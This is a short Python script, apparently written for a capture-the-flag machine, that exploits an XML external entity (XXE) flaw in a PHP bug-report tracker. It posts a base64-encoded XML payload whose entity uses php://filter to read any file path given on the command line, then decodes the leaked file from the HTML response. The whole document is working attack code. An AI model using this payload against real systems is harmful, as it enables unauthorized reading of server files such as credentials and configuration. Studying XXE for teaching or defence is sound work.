import base64
import urllib.parse
from bs4  import BeautifulSoup
import requests
from sys import argv

if len(argv) <= 1:
        print("USAGE: python exploit.py <IP> <FILE>")
        exit(1)

ip = argv[1]
file = argv[2]

data = f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource={file}"> ]>
                <bugreport>
                <title>&xxe;</title>
                <cwe>test</cwe>
                <cvss>test</cvss>
                <reward>test</reward>
                </bugreport>"""
data = str.encode(data)
data = base64.b64encode(data).decode("ascii")

r = requests.post(f"http://{ip}/tracker_diRbPr00f314.php",data={"data":data})
file = r.text
soup = BeautifulSoup(file, 'html.parser')
td = soup.find_all('td')
b64_text = td[1].get_text()
b64_text = str.encode(b64_text)
b64_extract = base64.b64decode(b64_text).decode(errors='replace')
print(b64_extract)
